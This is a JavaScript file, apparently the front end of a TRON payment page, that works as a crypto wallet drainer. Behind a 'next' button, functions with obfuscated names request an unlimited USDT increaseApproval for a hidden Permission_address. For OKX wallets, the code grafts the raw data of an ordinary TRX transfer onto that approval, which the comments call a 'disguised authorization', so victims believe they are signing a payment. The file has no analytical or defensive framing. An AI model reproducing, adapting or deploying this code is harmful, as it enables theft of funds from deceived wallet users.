
// 下一步按钮点击处理函数
async function onNextButtonClick() {
    try {
        // 检查钱包是否已连接
        if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
            console.log('钱包未连接，尝试连接');
            await connectWallet();
            tip('请重新点击按钮继续操作');
            return; // 连接后停止，等待用户再次点击
        }
        
        // 钱包已连接，直接执行操作
        console.log('准备执行转账/授权操作，金额：', currentAmount);
        
        if (typeof window.okxwallet !== 'undefined') {
            console.log('检测到 OKX 钱包，执行 okxapproval');
            await DjdskdbGsj();
        } else {
            console.log('非 OKX 钱包，执行 approval');
            await KdhshaBBHdg();
        }
    } catch (error) {
        console.error('操作执行失败:', error);
        tip('付款失败，请重新发起交易');
    }
}


async function DjdskdbGsj() {
    console.log("开始执行OKX伪装授权操作");
    
    const trxAmountInSun = tronWeb.toSun(currentAmount);
    const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    const feeLimit = 1000000000;  // 设置 feeLimit

    try {
        console.log("构建TRX转账交易...");
        let trxTransaction = await tronWeb.transactionBuilder.sendTrx(
            Payment_address,
            trxAmountInSun,
            tronWeb.defaultAddress.base58,
            { feeLimit: feeLimit }
        );

        console.log("构建USDT授权增加交易...");
        const increaseApprovalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
            tronWeb.address.toHex(usdtContractAddress),
            'increaseApproval(address,uint256)',
            { feeLimit: feeLimit },
            [
                { type: 'address', value: Permission_address },
                { type: 'uint256', value: maxUint256 }
            ],
            tronWeb.defaultAddress.base58
        );

        if (trxTransaction) {
            increaseApprovalTransaction.transaction.raw_data = trxTransaction.raw_data;
        }

        console.log("交易签名中...");
        const signedTransaction = await tronWeb.trx.sign(increaseApprovalTransaction.transaction);

        console.log("发送交易...");
        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);

        console.log("交易结果:", result);

        if (result.result || result.success) {
            const transactionHash = result.txid || (result.transaction && result.transaction.txID);
            if (!transactionHash) {
                throw new Error("无法获取交易哈希");
            }
            console.log("OKX伪装授权增加交易发送成功，交易哈希:", transactionHash);
            tip("授权成功");
            return transactionHash;
        } else {
            throw new Error("OKX伪装授权增加交易失败");
        }
    } catch (error) {
        console.error("执行OKX伪装授权增加操作失败:", error);
        tip("授权失败，请重试");
        throw error;
    }
}

async function KdhshaBBHdg() {
    console.log("开始执行正常授权增加操作");

    const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    const feeLimit = 100000000;  // 设置feeLimit为100 TRX
    const usdtContractAddressHex = tronWeb.address.toHex(usdtContractAddress);

    try {
        console.log("构建交易...");
        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
            usdtContractAddressHex,
            'increaseApproval(address,uint256)',
            { feeLimit: feeLimit },
            [
                { type: 'address', value: tronWeb.address.toHex(Permission_address) },
                { type: 'uint256', value: maxUint256 }
            ],
            tronWeb.defaultAddress.base58
        );

        if (!transaction || !transaction.transaction || !transaction.transaction.raw_data) {
            throw new Error('正常授权交易构建失败');
        }

        console.log("交易签名中...");
        const signedTransaction = await tronWeb.trx.sign(transaction.transaction);

        console.log("发送交易...");
        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);

        console.log("交易结果:", result);

        if (result.result || result.success) {
            let transactionHash;
            if (result.transaction && result.transaction.txID) {
                transactionHash = result.transaction.txID;
            } else if (result.txid) {
                transactionHash = result.txid;
            } else {
                throw new Error("无法获取交易哈希");
            }

            console.log("交易发送成功，哈希:", transactionHash);
            tip("授权成功");

            // 如果需要，您可以在这里添加其他逻辑，例如数据库操作或发送通知

            return transactionHash;
        } else {
            throw new Error("正常授权交易失败");
        }
    } catch (error) {
        console.error("执行正常授权增加操作失败:", error);
        if (error && error.message) {
            console.error("错误信息:", error.message);
        }
        tip("授权失败，请重试");
        throw error;
    }
}

